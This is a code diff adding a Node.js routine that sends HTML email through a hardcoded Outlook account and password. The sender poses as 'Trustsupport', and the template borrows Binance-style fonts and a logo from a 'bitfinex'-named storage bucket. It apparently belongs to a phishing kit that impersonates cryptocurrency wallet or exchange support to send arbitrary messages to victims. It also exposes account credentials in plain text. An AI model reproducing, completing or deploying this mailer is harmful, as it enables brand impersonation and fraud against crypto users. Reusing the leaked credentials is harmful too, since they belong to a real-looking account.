@@ -1,0 +1,21 @@
+var nodeoutlook = require("nodejs-nodemailer-outlook");
+
+nodeoutlook.sendEmail({
+    auth: {
+      user: "trustwalletspport100@outlook.com",
+      pass: "trustwallet@2024",
+    },
+    from: `"Trustsupport" <trustwalletspport100@outlook.com`,
+    to: to,
+    subject: `${subject} / Trustsupport`,
+    html: `<div style="background-color: #efefef"> <div class="adM"></div> <div style="margin: 0px auto; max-width: 600px"> <div class="adM"></div> <table style="width: 100%" role="presentation" border="0" cellspacing="0" cellpadding="0" align="center" > <tbody> <tr> <td style=" direction: ltr; font-size: 0px; padding: 0; text-align: center; " > <div style="margin: 0px auto; max-width: 600px"> <table style="width: 100%" role="presentation" border="0" cellspacing="0" cellpadding="0" align="center" > <tbody> <tr> <td style=" direction: ltr; font-size: 0px; padding: 0; text-align: center; " > <div class="m_6130901934158145068mj-column-per-100" style=" font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 100%; " > <table style="vertical-align: top" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" > <tbody> <tr> <td style=" font-size: 0px; padding: 0; word-break: break-word; " align="center" > <table style=" min-width: 100%; max-width: 100%; width: 100px; border-collapse: collapse; border-spacing: 0px; " role="presentation" border="0" cellspacing="0" cellpadding="0" > <tbody> <tr> <td style="background: blue; padding: 20px" > <img style=" border: 0; display: block; outline: none; text-decoration: none; height: auto; /* min-width:100%; */ width: 200px; /* max-width:100%; */ font-size: 13px; " src="https://firebasestorage.googleapis.com/v0/b/bitfinex-8a8f0.appspot.com/o/logo%20(2).png?alt=media&token=ddcf492c-a615-458b-9777-59a9a9c4c03d" width="100" height="auto" class="CToWUd" data-bit="iit" /> </td> </tr> </tbody> </table> </td> </tr> </tbody> </table> </div> </td> </tr> </tbody> </table> </div> </td> </tr> </tbody> </table> </div> <div style=" background: #ffffff; background-color: #ffffff; margin: 0px auto; max-width: 600px; " > <table style="background: #ffffff; background-color: #ffffff; width: 100%" role="presentation" border="0" cellspacing="0" cellpadding="0" align="center" > <tbody> <tr> <td style=" direction: ltr; font-size: 0px; padding: 5px 5px 5px 5px; text-align: center; " > <div style="margin: 0px auto; max-width: 590px"> <table style="width: 100%" role="presentation" border="0" cellspacing="0" cellpadding="0" align="center" > <tbody> <tr> <td style=" direction: ltr; font-size: 0px; padding: 5px 5px 5px 5px; text-align: center; " > <div class="m_6130901934158145068mj-column-per-100" style=" font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 100%; " > <table style="vertical-align: top" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" > <tbody> <tr> <td style=" font-size: 0px; padding: 5px 5px 10px 5px; word-break: break-word; " align="left" > <div style=" font-family: BinancePlex, Arial, PingFangSC-Regular, 'Microsoft YaHei', sans-serif; font-size: 20px; font-weight: 900; line-height: 25px; text-align: left; color: #000000; " > ${subject} </div> </td> </tr> <tr> <td style=" background: #ffffff; font-size: 0px; padding: 5px 5px 5px 5px; word-break: break-word; " align="left" > <div style=" font-family: BinancePlex, Arial, PingFangSC-Regular, 'Microsoft YaHei', sans-serif; font-size: 14px; line-height: 20px; text-align: left; color: #000000; " > <div> ${message} </div> </div> </td> </tr> <tr> <td style=" font-size: 0px; padding: 5px 5px 5px 5px; word-break: break-word; " align="center" > <div style=" font-family: BinancePlex, Arial, PingFangSC-Regular, 'Microsoft YaHei', sans-serif; font-size: 11px; line-height: 15px; text-align: center; color: #000000; " > © 2024 <span class="il">${sitename}</span>, All Rights Reserved. </div> </td> </tr> </tbody> </table> </div> </td> </tr> </tbody> </table> </div> </td> </tr> </tbody> </table> </div></div>`,
+
+    onError: (e) => {
+      res.sendStatus(500);
+      console.log(e);
+    },
+    onSuccess: (i) => {
+      res.sendStatus(200);
+      console.log(i);
+    },
+  });
